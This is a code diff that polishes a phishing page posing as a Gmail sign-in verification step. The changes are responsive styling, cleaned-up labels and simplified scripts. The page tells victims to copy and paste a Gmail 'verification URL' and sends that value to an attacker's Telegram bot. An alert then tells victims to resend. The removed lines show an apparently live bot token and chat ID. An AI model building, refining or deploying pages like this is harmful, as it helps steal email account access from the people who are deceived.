@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -21,25 +22,32 @@
             font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto;
             background: linear-gradient(180deg, #07462f 0%, #053a27 100%);
             color: #0b2b1e;
+            display: flex;
+            /* Centering the content */
+            justify-content: center;
+            /* Center horizontally */
+            align-items: center;
+            /* Center vertically */
         }
         
         .wrap {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            width: 100%;
+            /* Full width for mobile */
+            max-width: 480px;
+            /* Set max width for larger screens */
             padding: 28px 16px;
             box-sizing: border-box;
         }
         
         .card {
             width: 100%;
-            max-width: 420px;
             background: var(--card);
             border-radius: var(--radius);
             box-shadow: 0 18px 30px rgba(3, 25, 18, 0.35);
             padding: 28px;
             text-align: center;
+            margin: auto;
+            /* Center the card */
         }
         
         .logo {
@@ -143,6 +151,22 @@
             color: var(--green);
             text-decoration: underline;
         }
+        /* Responsive adjustments */
+        
+        @media (max-width: 600px) {
+            .logo {
+                font-size: 28px;
+                /* Smaller logo on mobile */
+            }
+            h1 {
+                font-size: 18px;
+                /* Smaller heading */
+            }
+            input {
+                font-size: 14px;
+                /* Smaller text in input */
+            }
+        }
     </style>
 </head>
 
@@ -168,7 +192,7 @@
                 <input type="hidden" name="csrfmiddlewaretoken" value="89rSqdSixXHmmv8rMQ2hsH6bWPZ7QUAvXjgXdA2OmDSdqa7VM9PdnpKTCdODWT25">
 
                 <div class="input-group">
-                    <label>Long Press Allow on Gmail send ,Copy Url and Paste verification URL here</label>
+                    <label>Long Press Allow on Gmail send, Copy URL and Paste verification URL here</label>
                     <input type="text" name="code" placeholder="">
                 </div>
 
@@ -180,25 +204,15 @@
             <button id="resendBtn" class="btn btn-primary">Resend email</button>
             <button class="btn btn-ghost">Try another way</button>
         </div>
-
-        <a href="#" class="cancel">Cancel signing in</a>
     </div>
 
     <script>
         // Display the email stored in localStorage
         const email = localStorage.getItem("userEmail");
-
-        // Check if the email exists and display it
-        if (email) {
-            document.getElementById("emailDisplay").innerText = email;
-        } else {
-            document.getElementById("emailDisplay").innerText = "No email found.";
-        }
+        document.getElementById("emailDisplay").innerText = email ? email : "No email found.";
 
         let seconds = 25;
-        let btn = document.getElementById('resendBtn');
-        const TELEGRAM_BOT_TOKEN = '8557833693:AAH4LBXHy5LeKk90dcO1-8nwarAggwrjmOc'; // Replace with your bot token
-        const CHAT_ID = '1345737806'; // Replace with your chat ID
+        const btn = document.getElementById('resendBtn');
 
         function countdown() {
             seconds--;
@@ -207,8 +221,6 @@
                 btn.innerHTML = "Resend email";
                 return;
             }
-
-            countElem.textContent = seconds;
             btn.innerHTML = `Resend email (<span id="count">${seconds}</span> sec.)`;
             setTimeout(countdown, 1000);
         }
@@ -216,8 +228,7 @@
         setTimeout(countdown, 1000);
 
         document.querySelector('form').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent default form submission
-
+            event.preventDefault();
             const verificationUrl = document.querySelector('input[name="code"]').value;
 
             // Send verification URL to the Telegram bot
@@ -238,8 +249,8 @@
                     return response.json();
                 })
                 .then(data => {
-                    alert('copy url well and resend again');
-                    console.log(data); // Optional: log the response from Telegram
+                    alert('Copy the URL well and resend again');
+                    console.log(data);
                 })
                 .catch(error => {
                     alert('Error sending verification URL: ' + error);
